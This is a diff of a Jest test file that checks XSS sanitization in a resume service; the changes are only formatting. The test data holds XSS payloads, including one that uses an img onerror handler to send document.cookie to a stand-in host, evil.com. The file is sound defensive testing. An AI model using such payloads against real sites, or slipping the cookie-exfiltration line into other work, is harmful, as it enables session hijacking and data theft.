@@ -26,7 +26,10 @@ describe('XSS Sanitization - BUG DETECTION', () => {
         ResumesService,
         { provide: ResumesRepository, useValue: mockRepository },
         { provide: PrismaService, useValue: {} },
-        { provide: AppLoggerService, useValue: { log: jest.fn(), debug: jest.fn() } },
+        {
+          provide: AppLoggerService,
+          useValue: { log: jest.fn(), debug: jest.fn() },
+        },
       ],
     }).compile();
 
@@ -48,7 +51,7 @@ describe('XSS Sanitization - BUG DETECTION', () => {
       '<input onfocus=alert("XSS") autofocus>',
       '<marquee onstart=alert("XSS")>',
       '"><script>alert("XSS")</script>',
-      '\';alert(String.fromCharCode(88,83,83))//\';',
+      "';alert(String.fromCharCode(88,83,83))//';",
     ];
 
     xssPayloads.forEach((payload, index) => {
@@ -79,14 +82,16 @@ describe('XSS Sanitization - BUG DETECTION', () => {
     });
 
     it('should sanitize HTML in experience description', async () => {
-      const xssDescription = '<script>document.cookie</script>Worked on projects';
+      const xssDescription =
+        '<script>document.cookie</script>Worked on projects';
 
       // When creating experience, description should be sanitized
       // BUG: Currently no sanitization!
     });
 
     it('should sanitize HTML in project description', async () => {
-      const xssDescription = '<img src=x onerror="fetch(\'evil.com?c=\'+document.cookie)">';
+      const xssDescription =
+        '<img src=x onerror="fetch(\'evil.com?c=\'+document.cookie)">';
 
       // When creating project, description should be sanitized
       // BUG: Currently no sanitization!
@@ -109,4 +114,3 @@ describe('XSS Sanitization - BUG DETECTION', () => {
     });
   });
 });
-
